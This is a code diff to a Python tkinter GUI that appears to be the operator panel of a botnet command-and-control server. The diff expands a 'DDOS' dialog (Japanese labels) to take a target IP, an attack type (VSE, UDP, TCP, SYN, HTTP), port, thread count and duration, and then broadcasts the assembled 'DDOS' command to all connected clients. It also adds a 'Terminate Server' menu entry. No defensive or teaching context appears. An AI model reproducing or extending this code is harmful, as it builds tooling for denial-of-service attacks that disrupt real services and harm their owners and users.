@@ -164,30 +164,46 @@ def ddos_message():
     modal_dialog.grab_set()
     
     
-    label=ttk.Label(modal_dialog, text="URL")
+
+    # UI部品の作成
+    label = ttk.Label(modal_dialog, text="IP")
     label.pack()
     urlbox = ttk.Entry(modal_dialog)
     urlbox.pack()
+    
+    labellayer = ttk.Label(modal_dialog, text="攻撃の種類")
+    labellayer.pack()
+    layerbox = ttk.Combobox(modal_dialog, values=["VSE", "UDP", "TCP", "SYN", "HTTP"])
+    layerbox.pack()
+    
+    labelport = ttk.Label(modal_dialog, text="ポート")
+    labelport.pack()
+    portbox = ttk.Spinbox(modal_dialog, from_=1, to=9999, increment=1)
+    portbox.pack()
+
     labelthr = ttk.Label(modal_dialog, text="スレッド数")
     labelthr.pack()
     thrlevel = ttk.Spinbox(modal_dialog, from_=1, to=9999, increment=1)
     thrlevel.pack()
     
-    
-    
+    labelsecs = ttk.Label(modal_dialog, text="秒数")
+    labelsecs.pack()
+    secsbox = ttk.Spinbox(modal_dialog, from_=1, to=9999, increment=0.000001)
+    secsbox.pack()
+
+    # OKボタンの処理
+    def on_ok():
+        data = ['DDOS', urlbox.get(), portbox.get(), thrlevel.get(), secsbox.get(), layerbox.get()]
+        modal_dialog.destroy()
+        dei = dataproccessor(data)
+        send_to_all_clients(f"all:{dei}")
 
     # OKボタンを追加して閉じる処理を設定
-    ok_button = tk.Button(modal_dialog, text="OK", command=modal_dialog.destroy)
+    ok_button = tk.Button(modal_dialog, text="OK", command=on_ok)
     ok_button.pack()
 
     # ダイアログが閉じられるまで待つ
     root.wait_window(modal_dialog)
-    
-    data = ['DDOS', urlbox.get(), thrlevel.get()]
-    
-    
-    dei = dataproccessor(data)
-    send_to_all_clients("all:{dei}")
 
 def show_context_menu(event):
     try:
@@ -243,6 +259,7 @@ menu_bar.add_cascade(label="System", menu=system_menu)
 system_menu.add_command(label="Open Log Window", command=show_log_window)
 system_menu.add_command(label="DDOS", command=ddos_message)
 system_menu.add_command(label="Version", command=show_ver_window)
+system_menu.add_command(label="Terminate Server", command=on_closing)
 
 frame = tk.Frame(root)
 frame.pack(fill='both', expand=True)
